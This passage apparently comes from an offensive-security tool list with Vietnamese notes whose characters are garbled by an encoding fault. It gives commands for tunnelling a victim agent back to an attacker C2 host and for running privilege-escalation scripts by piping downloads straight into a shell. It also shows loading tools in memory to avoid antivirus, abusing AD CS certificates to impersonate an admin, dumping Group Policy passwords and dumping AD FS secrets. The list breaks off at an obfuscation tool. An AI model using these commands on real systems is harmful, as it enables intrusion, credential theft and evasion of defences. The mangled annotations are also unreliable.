**LÆ°u Ã½:** Äá»ƒ **ligolo-ng** hoáº¡t Ä‘á»™ng trÃªn **Windows**, cáº§n cÃ³ thÆ° viá»‡n **Wintun** Ä‘á»ƒ táº¡o giao diá»‡n máº¡ng userland.

**Thiáº¿t láº­p (Proxy server):**

```bash
./proxy -h # CÃ¡c tÃ¹y chá»n trá»£ giÃºp
./proxy -autocert # Tá»± Ä‘á»™ng yÃªu cáº§u chá»©ng chá»‰ LetsEncrypt
```
**LÆ°u Ã½:** Cháº¡y tá»‡p nhá»‹ phÃ¢n `proxy` server trÃªn mÃ¡y attacker.

**CÃ¡ch sá»­ dá»¥ng:**

*Start the agent on your target (victim) computer (no privileges are required!):*

```bash
./agent -connect attacker_c2_server.com:11601
```
**LÆ°u Ã½:** Cháº¡y tá»‡p nhá»‹ phÃ¢n `agent` trÃªn mÃ¡y náº¡n nhÃ¢n, káº¿t ná»‘i vá» Ä‘á»‹a chá»‰/cá»•ng cá»§a `proxy` server cá»§a attacker. Cá»•ng 11601 lÃ  cá»•ng máº·c Ä‘á»‹nh cho káº¿t ná»‘i reverse TLS. Agent táº¡o **tunnel** reverse shell vá» attacker.

A session should appear on the proxy server.

```
INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
```

Use the session command to select the agent.

```
ligolo-ng Â» session
? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/nicocha30/ligolo-ng#using-ligolo-ng).

![image](https://user-images.githubusercontent.com/100603074/216729440-80871cad-4c06-4eb5-8e91-d083ea3f1d2b.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/nicocha30/ligolo-ng#demo*

**Privilege Escalation**
====================

### [ğŸ”™](#tool-list)[**Crassus**](https://github.com/vu-ls/Crassus)

"Accenture made a tool called Spartacus, which finds **DLL hijacking opportunities** on **Windows**. Using Spartacus as a starting point, we created **Crassus** to extend **Windows privilege escalation** finding capabilities beyond simply looking for missing files. The **ACLs** used by files and directories of privileged processes can find more than just looking for missing files to achieve the goal." - [LiÃªn káº¿t](https://github.com/vu-ls/Crassus?tab=readme-ov-file#why-crassus)

**Install (Build):**

**Crassus** was developed as a **Visual Studio 2019** project. To build **Crassus.exe**:

1. Open **Crassus.sln**
2. Press **Ctrl+Shift+B** on your keyboard
**LÆ°u Ã½:** HÆ°á»›ng dáº«n biÃªn dá»‹ch mÃ£ nguá»“n **C#** báº±ng **Visual Studio**.

**Install (Precompiled):**

If you trust running other people's code without knowing what it does, **Crassus.exe** is [provided in this repository](https://github.com/vu-ls/Crassus/blob/main/binaries/Crassus.exe).
**LÆ°u Ã½:** Táº£i file `.exe` Ä‘Ã£ biÃªn dá»‹ch sáºµn.

**CÃ¡ch sá»­ dá»¥ng:**

1. In [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), select the `Enable Boot Logging` option.
2. Reboot.
3. Once you have logged in and Windows has settled, optionally also run [scheduled tasks that may be configured to run with privileges](https://gist.github.com/wdormann/8afe4edf605627ee4f203861b6cc3a1c).
4. Run **Process Monitor** once again.
5. When prompted, save the boot log.
6. Reset the default Process Monitor filter using `Ctrl-R`.
7. Save this log file, e.g., to `boot.PML`. The reason for re-saving the log file is twofold:
    1. Older versions of Process Monitor do not save boot logs as a single file.
    2. Boot logs by default will be unfiltered, which may contain extra noise, such as a local-user **DLL hijacking** in the launching of of Process Monitor itself.
**LÆ°u Ã½:** HÆ°á»›ng dáº«n chi tiáº¿t vá» quy trÃ¬nh sá»­ dá»¥ng **Crassus**. Báº¡n cáº§n sá»­ dá»¥ng **Process Monitor** (má»™t **cÃ´ng cá»¥ Sysinternals**) Ä‘á»ƒ ghi láº¡i hoáº¡t Ä‘á»™ng há»‡ thá»‘ng trong quÃ¡ trÃ¬nh khá»Ÿi Ä‘á»™ng hoáº·c thá»±c thi cÃ¡c tiáº¿n trÃ¬nh khÃ¡c. File log tá»« **Procmon** nÃ y (`boot.PML` hoáº·c file báº¡n tá»± lÆ°u) sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng lÃ m Ä‘áº§u vÃ o cho **Crassus.exe** Ä‘á»ƒ phÃ¢n tÃ­ch vÃ  tÃ¬m kiáº¿m cÃ¡c cÆ¡ há»™i nÃ¢ng quyá»n cá»¥c bá»™ (liÃªn quan Ä‘áº¿n **DLL hijacking** vÃ  quyá»n truy cáº­p file/thÆ° má»¥c).

![Crassus](https://github.com/user-attachments/assets/0194b7bf-80ee-44cd-a576-22bc6888de8a)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/vu-ls/Crassus?tab=readme-ov-file#screenshots*

### [ğŸ”™](#tool-list)[**LinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

**LinPEAS** is a nice verbose **privilege escalation tool** for finding local privesc routes on **Linux** endpoints.

**Install + Usage:**

```bash
curl -L "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" | sh
```
**LÆ°u Ã½:** Lá»‡nh nÃ y táº£i xuá»‘ng **script LinPEAS** trá»±c tiáº¿p tá»« **GitHub** báº±ng `curl` vÃ  sau Ä‘Ã³ thá»±c thi nÃ³ báº±ng `sh`. PhÆ°Æ¡ng phÃ¡p ráº¥t phá»• biáº¿n Ä‘á»ƒ cháº¡y nhanh má»™t **script privesc** trÃªn há»‡ thá»‘ng **Linux** má»¥c tiÃªu Ä‘Ã£ bá»‹ xÃ¢m nháº­p. Output sáº½ liá»‡t kÃª cÃ¡c cÆ¡ há»™i nÃ¢ng quyá»n khÃ¡c nhau dá»±a trÃªn cáº¥u hÃ¬nh há»‡ thá»‘ng, quyá»n háº¡n cá»§a ngÆ°á»i dÃ¹ng, cÃ¡c file cáº¥u hÃ¬nh nháº¡y cáº£m, cÃ¡c dá»‹ch vá»¥ dá»… bá»‹ táº¥n cÃ´ng, ...

![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)

### [ğŸ”™](#tool-list)[**WinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

**WinPEAS** is a nice verbose **privilege escalation tool** for finding local privesc routes on **Windows** endpoints.

**Install + Usage:**

```bash
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ **PowerShell** nÃ y táº£i xuá»‘ng tá»‡p nhá»‹ phÃ¢n **WinPEASany_ofs.exe** trá»±c tiáº¿p tá»« **GitHub** vÃ o bá»™ nhá»› (`[byte[]]`) vÃ  sau Ä‘Ã³ load nÃ³ nhÆ° má»™t assembly .NET (`[System.Reflection.Assembly]::Load(...)`) vÃ  thá»±c thi hÃ m `Main`. Äiá»u nÃ y cho phÃ©p cháº¡y **WinPEAS** trong bá»™ nhá»› cá»§a tiáº¿n trÃ¬nh **PowerShell**, trÃ¡nh ghi file `.exe` xuá»‘ng Ä‘Ä©a vÃ  nÃ© trÃ¡nh cÃ¡c biá»‡n phÃ¡p phÃ¡t hiá»‡n dá»±a trÃªn chá»¯ kÃ½ tá»‡p hoáº·c giÃ¡m sÃ¡t viá»‡c táº¡o tiáº¿n trÃ¬nh má»›i tá»« cÃ¡c thÆ° má»¥c láº¡. **WinPEAS** sau Ä‘Ã³ sáº½ liá»‡t kÃª cÃ¡c cÆ¡ há»™i nÃ¢ng quyá»n cá»¥c bá»™ trÃªn há»‡ thá»‘ng **Windows**.

![image](https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png)

### [ğŸ”™](#tool-list)[**linux-smart-enumeration**](https://github.com/diego-treitos/linux-smart-enumeration)

**Linux smart enumeration** is another good, less verbose, **linux privesc tool** for **Linux**.

**Install + Usage:**

```bash
curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh
```
**LÆ°u Ã½:** Táº£i xuá»‘ng **script lse.sh** tá»« **GitHub** báº±ng `curl`, lÆ°u láº¡i (`-Lo`), vÃ  cáº¥p quyá»n thá»±c thi (`chmod 700`). Sau Ä‘Ã³ cÃ³ thá»ƒ cháº¡y script nÃ y (`./lse.sh`) Ä‘á»ƒ kiá»ƒm tra cÃ¡c cÆ¡ há»™i nÃ¢ng quyá»n cá»¥c bá»™ trÃªn **Linux**. Output gá»n gÃ ng hÆ¡n **LinPEAS**.

![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)

### [ğŸ”™](#tool-list)[**Certify**](https://github.com/GhostPack/Certify)

**Certify** is a **C# tool** to enumerate and abuse misconfigurations in **Active Directory Certificate Services (AD CS)**.

**Certify** is designed to be used in conjunction with other **red team tools** and techniques, such as **Mimikatz** and **PowerShell**, to enable red teamers to perform various types of attacks, including **man-in-the-middle** attacks, impersonation attacks, and **privilege escalation** attacks.

**Key features of Certify:**

- Certificate creation
- Certificate signing
- Certificate import
- Certificate trust modification

**Install (BiÃªn dá»‹ch):**

**Certify** is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the **Certify** [project .sln](https://github.com/GhostPack/Certify), choose "**Release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n **C#** báº±ng **Visual Studio**.

**Install (Running Certify Through PowerShell):**

If you want to run **Certify** in-memory through a **PowerShell** wrapper, first compile the **Certify** and **base64-encode** the resulting assembly:

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ **PowerShell** nÃ y Ä‘á»c tá»‡p nhá»‹ phÃ¢n **Certify.exe** thÃ nh cÃ¡c byte, mÃ£ hÃ³a chÃºng thÃ nh chuá»—i **Base64** vÃ  lÆ°u vÃ o tá»‡p vÄƒn báº£n.

**Certify** can then be loaded in a **PowerShell script** with the following (where "aa..." is replaced with the base64-encoded **Certify assembly string**):

```
$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ **PowerShell** nÃ y Ä‘á»c chuá»—i **Base64** Ä‘Ã£ lÆ°u, giáº£i mÃ£ nÃ³ thÃ nh cÃ¡c byte vÃ  load cÃ¡c byte Ä‘Ã³ nhÆ° má»™t **assembly .NET** trong bá»™ nhá»›.

The Main() method and any arguments can then be invoked as follows:

```
[Certify.Program]::Main("find /vulnerable".Split())
```
**LÆ°u Ã½:** Sau khi assembly Ä‘Æ°á»£c load vÃ o bá»™ nhá»›, báº¡n cÃ³ thá»ƒ gá»i hÃ m chÃ­nh cá»§a nÃ³ (`Main`) vÃ  truyá»n cÃ¡c Ä‘á»‘i sá»‘ nhÆ° thá»ƒ báº¡n Ä‘ang cháº¡y tá»‡p thá»±c thi trÃªn dÃ²ng lá»‡nh. Ká»¹ thuáº­t nÃ y (load assembly trong bá»™ nhá»›) thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ nÃ© trÃ¡nh AV/EDR dá»±a trÃªn giÃ¡m sÃ¡t file.

Full compile instructions can be found [táº¡i Ä‘Ã¢y](https://github.com/GhostPack/Certify#compile-instructions).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# See if there are any vulnerable templates
Certify.exe find /vulnerable

# Request a new certificate for a template/CA, specifying a DA localadmin as the alternate principal
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **cÃ´ng cá»¥ Certify.exe**. Module `find /vulnerable` tÃ¬m kiáº¿m cÃ¡c máº«u chá»©ng chá»‰ trong **AD CS** cÃ³ cáº¥u hÃ¬nh cho phÃ©p káº» táº¥n cÃ´ng yÃªu cáº§u chá»©ng chá»‰ giáº£ máº¡o Ä‘áº·c quyá»n. Module `request` yÃªu cáº§u má»™t chá»©ng chá»‰ má»›i vá»›i cÃ¡c thuá»™c tÃ­nh Ä‘áº·c biá»‡t (`/altname`) tá»« CA, táº­n dá»¥ng lá»— há»•ng Ä‘Æ°á»£c tÃ¬m tháº¥y. CÃ´ng cá»¥ nÃ y ráº¥t há»¯u Ã­ch Ä‘á»ƒ khai thÃ¡c cÃ¡c cáº¥u hÃ¬nh sai trong háº¡ táº§ng khÃ³a cÃ´ng khai cá»§a **Active Directory**.

Full example walkthrough can be found [táº¡i Ä‘Ã¢y](https://github.com/GhostPack/Certify#example-walkthrough).

![image](https://user-images.githubusercontent.com/100603074/210088651-28899ba5-cbbd-4b03-8000-068fd401476d.png)

### [ğŸ”™](#tool-list)[**Get-GPPPassword**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

**Get-GPPPassword** is a **PowerShell script** part of the **PowerSploit toolkit**, it is designed to retrieve passwords for local accounts that are created and managed using **Group Policy Preferences (GPP)**.

**Get-GPPPassword** works by searching the **SYSVOL** folder on the **domain controller** for any **GPP** files that contain password information. Once it finds these files, it decrypts the password information and displays it to the user.

**Install:**

Follow the **PowerSploit** [installation instructions](https://github.com/A-poc/RedTeam-Tools#powersploit) from this tool sheet.

```bash
powershell.exe -ep bypass
Import-Module PowerSploit
```
**LÆ°u Ã½:** (ÄÃ£ giáº£i thÃ­ch trong pháº§n **Execution**).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Get all passwords with additional information
Get-GPPPassword

# Get list of all passwords
Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
```
**LÆ°u Ã½:** Sá»­ dá»¥ng cmdlet `Get-GPPPassword` sau khi Ä‘Ã£ import module **PowerSploit** vÃ o phiÃªn **PowerShell** hiá»‡n táº¡i. NÃ³ tá»± Ä‘á»™ng quÃ©t vÃ  tÃ¬m cÃ¡c máº­t kháº©u Ä‘Ã£ lÆ°u trong **GPP** vÃ  hiá»ƒn thá»‹ chÃºng. Lá»‡nh thá»© hai sá»­ dá»¥ng pipeline (`|`) vÃ  cmdlet `ForEach-Object` vÃ  `Sort-Object -Uniq` Ä‘á»ƒ chá»‰ hiá»ƒn thá»‹ cÃ¡c máº­t kháº©u duy nháº¥t tá»« output.

![image](https://user-images.githubusercontent.com/100603074/210089230-6a61579b-849d-4175-96ec-6ea75e001038.png)

### [ğŸ”™](#tool-list)[**Sherlock**](https://github.com/rasta-mouse/Sherlock)

**PowerShell script** to quickly find missing software patches for local **privilege escalation** vulnerabilities.

*Há»— trá»£:*

- **MS10-015** : User Mode to Ring (**KiTrap0D**)
- **MS10-092** : Task Scheduler
- **MS13-053** : **NTUserMessageCall Win32k Kernel Pool Overflow**
- **MS13-081** : **TrackPopupMenuEx Win32k NULL Page**
- **MS14-058** : **TrackPopupMenu Win32k Null Pointer Dereference**
- **MS15-051** : ClientCopyImage **Win32k**
- **MS15-078** : Font Driver Buffer Overflow
- **MS16-016** : '**mrxdav.sys**' WebDAV
- **MS16-032** : Secondary Logon Handle
- **MS16-034** : **Windows Kernel-Mode Drivers EoP**
- **MS16-135** : **Win32k Elevation of Privilege**
- **CVE-2017-7199** : Nessus Agent 6.6.2 - 6.10.3 Priv Esc

**Install (PowerShell):**

```bash
# CÃ i Ä‘áº·t Git
git clone https://github.com/rasta-mouse/Sherlock

# Load powershell module
Import-Module -Name C:\INSTALL_LOCATION\Sherlock\Sherlock.ps1
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n **script Sherlock** báº±ng **Git** vÃ  sau Ä‘Ã³ import nÃ³ nhÆ° má»™t module vÃ o **PowerShell**. Báº¡n cáº§n thay Ä‘á»•i `C:\INSTALL_LOCATION` báº±ng Ä‘Æ°á»ng dáº«n thá»±c táº¿ nÆ¡i báº¡n lÆ°u script.

**CÃ¡ch sá»­ dá»¥ng (PowerShell):**

```bash
# Run all functions
Find-AllVulns

# Run specific function (MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference)
Find-MS14058
```
**LÆ°u Ã½:** `Find-AllVulns` lÃ  hÃ m chÃ­nh trong **script Sherlock** Ä‘á»ƒ kiá»ƒm tra há»‡ thá»‘ng cho táº¥t cáº£ cÃ¡c lá»— há»•ng **nÃ¢ng quyá»n cá»¥c bá»™** Ä‘Ã£ biáº¿t Ä‘Æ°á»£c há»— trá»£. CÃ¡c hÃ m khÃ¡c (vÃ­ dá»¥: `Find-MS14058`) cho phÃ©p kiá»ƒm tra má»™t lá»— há»•ng cá»¥ thá»ƒ. CÃ¡c hÃ m nÃ y sáº½ kiá»ƒm tra sá»± hiá»‡n diá»‡n cá»§a cÃ¡c báº£n vÃ¡ tÆ°Æ¡ng á»©ng hoáº·c cÃ¡c dáº¥u hiá»‡u khÃ¡c cá»§a lá»— há»•ng.

![image](https://user-images.githubusercontent.com/100603074/210182250-b5e9a4c1-4d30-4591-b06b-7d58098c7fef.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/*

### [ğŸ”™](#tool-list)[**Watson**](https://github.com/rasta-mouse/Watson)

**Watson** is a **.NET tool** designed to enumerate missing KBs and suggest exploits for **Privilege Escalation** vulnerabilities.

Great for identifying missing patches and suggesting exploits that could be used to exploit known vulnerabilities in order to gain higher privileges on the system.

**Install:**

Using [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the [**Watson** project .sln](https://github.com/rasta-mouse/Watson), choose "**Release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n **C#** báº±ng **Visual Studio**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Run all checks
Watson.exe
```
**LÆ°u Ã½:** Cháº¡y tá»‡p thá»±c thi **Watson.exe**. NÃ³ sáº½ tá»± Ä‘á»™ng kiá»ƒm tra há»‡ thá»‘ng **Windows** (báº£n vÃ¡ Ä‘Ã£ cÃ i Ä‘áº·t, phiÃªn báº£n há»‡ Ä‘iá»u hÃ nh,...) vÃ  so sÃ¡nh vá»›i danh sÃ¡ch cÃ¡c lá»— há»•ng **nÃ¢ng quyá»n cá»¥c bá»™** Ä‘Ã£ biáº¿t Ä‘á»ƒ bÃ¡o cÃ¡o nhá»¯ng lá»— há»•ng cÃ³ kháº£ nÄƒng tá»“n táº¡i cÃ¹ng vá»›i thÃ´ng tin vá» cÃ¡c exploit liÃªn quan.

![image](https://user-images.githubusercontent.com/100603074/210182370-409be1ac-64f9-4a07-96bd-b0752d7609a2.png)

*VÄƒn báº£n hÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/rasta-mouse/Watson#usage*

### [ğŸ”™](#tool-list)[**ImpulsiveDLLHijack**](https://github.com/knight0x07/ImpulsiveDLLHijack)

A **C# based tool** that automates the process of discovering and exploiting **DLL Hijack**s in target binaries.

The discovered Hijacked paths can be weaponized, during an engagement, to evade EDR's.

**Install:**

- **Procmon.exe** -> https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
- **Custom Confirmatory DLL's** :
	- These are DLL files which assist the tool to get the confirmation whether the DLL's are been successfully loaded from the identified hijack path
	- Compiled from the MalDLL project provided above (or use the precompiled binaries if you trust me!)
	- 32Bit dll name should be: **maldll32.dll**
	- 64Bit dll name should be: **maldll64.dll**
	- Install NuGet Package:** **PeNet** -> https://www.nuget.org/packages/PeNet/ (Prereq while compiling the **ImpulsiveDLLHijack** project)

**Note: i & ii prerequisites should be placed in the ImpulsiveDLLHijacks.exe's directory itself.**

- **Build and Setup Information:**

	- **ImpulsiveDLLHijack**

		- Clone the repository in **Visual Studio**
		- Once project is loaded in **Visual Studio** go to "**Project**" --> "**Manage NuGet packages**" --> Browse for packages and install "**PeNet**" -> https://www.nuget.org/packages/PeNet/
		- Build the project!
		- The **ImpulsiveDLLHijack.exe** will be inside the bin directory.

	- **And for Confirmatory DLL's:**

		- Clone the repository in **Visual Studio**
		- Build the project with **x86** and **x64**
		- Rename **x86** release as **maldll32.dll** and **x64** release as **maldll64.dll**

	- **Setup:** Copy the Confirmatory DLL's (**maldll32** & **maldll64**) in the **ImpulsiveDLLHijack.exe** directory & then execute **ImpulsiveDLLHijack.exe** :))

*Install instructions from https://github.com/knight0x07/ImpulsiveDLLHijack#2-prerequisites*
**LÆ°u Ã½:** **ImpulsiveDLLHijack** lÃ  má»™t cÃ´ng cá»¥ phá»©c táº¡p yÃªu cáº§u chuáº©n bá»‹ cÃ¡c file phá»¥ trá»£ (**Procmon**, cÃ¡c DLL xÃ¡c nháº­n) vÃ  mÃ´i trÆ°á»ng build **Visual Studio**. Má»¥c Ä‘Ã­ch cá»§a nÃ³ lÃ  tá»± Ä‘á»™ng tÃ¬m kiáº¿m cÃ¡c cÆ¡ há»™i **DLL Hijack** trong cÃ¡c chÆ°Æ¡ng trÃ¬nh khÃ¡c, cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ thá»±c thi mÃ£ Ä‘á»™c thÃ´ng qua má»™t á»©ng dá»¥ng Ä‘Ã¡ng tin cáº­y, nÃ© trÃ¡nh sá»± phÃ¡t hiá»‡n.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Help
ImpulsiveDLLHijack.exe -h

# Look for vulnerabilities in an executable
ImpulsiveDLLHijack.exe -path BINARY_PATH
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **ImpulsiveDLLHijack.exe** vá»›i cá» `-path` chá»‰ Ä‘á»‹nh Ä‘Æ°á»ng dáº«n Ä‘áº¿n tá»‡p thá»±c thi mÃ  báº¡n muá»‘n phÃ¢n tÃ­ch Ä‘á»ƒ tÃ¬m cÆ¡ há»™i **DLL Hijack**. CÃ´ng cá»¥ sáº½ tá»± Ä‘á»™ng cháº¡y tá»‡p nÃ y (hoáº·c mÃ´ phá»ng) vÃ  theo dÃµi báº±ng **Procmon** Ä‘á»ƒ tÃ¬m cÃ¡c ná»— lá»±c táº£i DLL bá»‹ thiáº¿u hoáº·c cÃ³ thá»ƒ bá»‹ ghi Ä‘Ã¨.

Usage examples can be found [táº¡i Ä‘Ã¢y](https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples).

![image](https://user-images.githubusercontent.com/100603074/210267803-cefee62b-f16d-4768-81d0-9001ef1a2b98.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/knight0x07/ImpulsiveDLLHijack#4-examples*

### [ğŸ”™](#tool-list)[**ADFSDump**](https://github.com/mandiant/ADFSDump)

A C# tool to dump all sorts of goodies from **AD FS**.

Created by Doug Bienstock [@doughsec](https://twitter.com/doughsec) while at Mandiant FireEye.

This tool is designed to be run in conjunction with **ADFSpoof**. **ADFSDump** will output all of the information needed in order to generate security tokens using **ADFSpoof**.

**Requirements:**

- **ADFSDump** must be run under the user context of the **AD FS** service account. You can get this information by running a process listing on the **AD FS server** or from the output of the **Get-ADFSProperties cmdlet**. Only the **AD FS service account** has the permissions needed to access the configuration database. Not even a **DA** can access this.
- **ADFSDump** assumes that the service is configured to use the **Windows Internal Database (WID)**. Although it would be trivial to support an external SQL server, this feature does not exist right now.
- **ADFSDump** must be run locally on an **AD FS server**, NOT an **AD FS web application proxy**. The **WID** can only be accessed locally via a named pipe.
**LÆ°u Ã½:** CÃ¡c yÃªu cáº§u vÃ  háº¡n cháº¿ quan trá»ng khi sá»­ dá»¥ng **ADFSDump**. NÃ³ chá»‰ hoáº¡t Ä‘á»™ng cá»¥c bá»™ trÃªn **AD FS server** (khÃ´ng pháº£i proxy), chá»‰ há»— trá»£ **WID** (database ná»™i bá»™), vÃ  **quan trá»ng nháº¥t** lÃ  pháº£i cháº¡y dÆ°á»›i tÃ i khoáº£n dá»‹ch vá»¥ cá»§a **AD FS**, Ä‘Ã¢y lÃ  tÃ i khoáº£n duy nháº¥t cÃ³ quyá»n truy cáº­p database cáº¥u hÃ¬nh nháº¡y cáº£m.

**Install (BiÃªn dá»‹ch):**

**ADFSDump** was built against .NET 4.5 with Visual Studio 2017 Community Edition. Simply open up the project .sln, choose "**Release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch mÃ£ nguá»“n **C#** báº±ng **Visual Studio**.

**CÃ¡ch sá»­ dá»¥ng (Cá»):**

```bash
# Domain Active Directory má»¥c tiÃªu. Máº·c Ä‘á»‹nh lÃ  domain hiá»‡n táº¡i.
/domain:

# Domain Controller má»¥c tiÃªu. Máº·c Ä‘á»‹nh lÃ  DC hiá»‡n táº¡i.
/server:

# Switch. Chuyá»ƒn Ä‘á»•i Ä‘á»ƒ vÃ´ hiá»‡u hÃ³a viá»‡c xuáº¥t khÃ³a DKM.
/nokey

# (tÃ¹y chá»n) Chuá»—i káº¿t ná»‘i SQL náº¿u ADFS Ä‘ang sá»­ dá»¥ng MS SQL tá»« xa thay vÃ¬ WID.
/database
```
**LÆ°u Ã½:** MÃ´ táº£ cÃ¡c cá» dÃ²ng lá»‡nh chÃ­nh cá»§a **ADFSDump.exe**. CÃ´ng cá»¥ nÃ y xuáº¥t ra cÃ¡c bÃ­ máº­t cáº¥u hÃ¬nh **AD FS** bao gá»“m khÃ³a giáº£i mÃ£ (**DKM key**) cáº§n thiáº¿t Ä‘á»ƒ sá»­ dá»¥ng cÃ¹ng vá»›i **ADFSpoof**.

[Blog - Exploring the Golden SAML Attack Against ADFS](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)

![image](https://user-images.githubusercontent.com/100603074/212204724-65da5505-3576-4e6d-91ab-989b96247182.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs*

### [ğŸ”™](#tool-list)[**BeRoot**](https://github.com/AlessandroZ/BeRoot)

**BeRoot Project** is a **post exploitation tool** to check common misconfigurations to find a way to escalate our privilege.

The goal of **BeRoot** is to only output potential **privilege escalation opportunities** and not a endpoint configuration assessment.

This project works on **Windows, Linux** and **Mac OS**.

**Install (Linux):**

```bash
git clone https://github.com/AlessandroZ/BeRoot
cd BeRoot/Linux/
```
**LÆ°u Ã½:** Clone mÃ£ nguá»“n báº±ng **Git** vÃ  di chuyá»ƒn vÃ o thÆ° má»¥c con cho phiÃªn báº£n **Linux**.

**Install (**Windows**):**

A pre-compiled version of **BeRoot** can be found [táº¡i Ä‘Ã¢y](https://github.com/AlessandroZ/BeRoot/releases).
**LÆ°u Ã½:** Táº£i file `.exe` Ä‘Ã£ biÃªn dá»‹ch sáºµn.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Run BeRoot
python beroot.py

# Run BeRoot with user password (If you know the password use it, you could get more results)
python beroot.py --password super_strong_password
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **script Python beroot.py** (trong thÆ° má»¥c `Linux/`). `-m password` vá»›i tÃ¹y chá»n `--password` cho phÃ©p kiá»ƒm tra cÃ¡c cÆ¡ há»™i nÃ¢ng quyá»n cá»¥c bá»™ mÃ  cáº§n thÃ´ng tin xÃ¡c thá»±c (vÃ­ dá»¥: cÃ¡c file cáº¥u hÃ¬nh chá»‰ cÃ³ thá»ƒ Ä‘á»c bá»Ÿi ngÆ°á»i dÃ¹ng Ä‘Ã³). **BeRoot** tÃ¬m kiáº¿m cÃ¡c cáº¥u hÃ¬nh sai cá»¥c bá»™ phá»• biáº¿n nhÆ° quyá»n háº¡n khÃ´ng Ä‘Ãºng, cÃ¡c tá»‡p cáº¥u hÃ¬nh nháº¡y cáº£m, cÃ¡c lá»— há»•ng phiÃªn báº£n pháº§n má»m,... Ä‘á»ƒ Ä‘á» xuáº¥t cÃ¡c cÃ¡ch **nÃ¢ng quyá»n**.

Further information can be found here for:

- [Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)
- [Windows](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4c84ffeb-1ffb-474a-b028-4c8fcc64deb6)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/AlessandroZ/BeRoot*

**Defense Evasion**
====================

### [ğŸ”™](#tool-list)[**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation)

A **PowerShell v2.0+** compatible **PowerShell command** and **script obfuscator**. If a victim endpoint is able to execute **PowerShell** then this tool is great for creating heavily obfuscated scripts.

**Install:**

```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n **Invoke-Obfuscation** báº±ng **Git**. ÄÃ¢y lÃ  má»™t script PowerShell vÃ  bá»™ module PowerShell, cháº¡y trÃªn **Windows** trong mÃ´i trÆ°á»ng PowerShell.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
./Invoke-Obfuscation
```
